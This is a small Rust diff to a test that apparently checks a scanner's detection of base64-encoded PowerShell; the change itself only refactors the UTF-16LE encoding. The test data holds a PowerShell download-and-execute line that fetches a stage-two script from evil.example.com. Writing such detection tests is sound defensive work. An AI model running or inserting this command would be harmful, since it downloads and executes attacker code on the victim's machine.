@@ -240,10 +240,7 @@ fn test_powershell_encoded_command_detected() {
     let tmp = TempDir::new().unwrap();
     let ps_code =
         "IEX(New-Object Net.WebClient).DownloadString('http://evil.example.com/stage2.ps1')";
-    let utf16le: Vec<u8> = ps_code
-        .encode_utf16()
-        .flat_map(|c| c.to_le_bytes())
-        .collect();
+    let utf16le: Vec<u8> = ps_code.encode_utf16().flat_map(u16::to_le_bytes).collect();
     let b64 = base64::engine::general_purpose::STANDARD.encode(&utf16le);
 
     let script = format!(
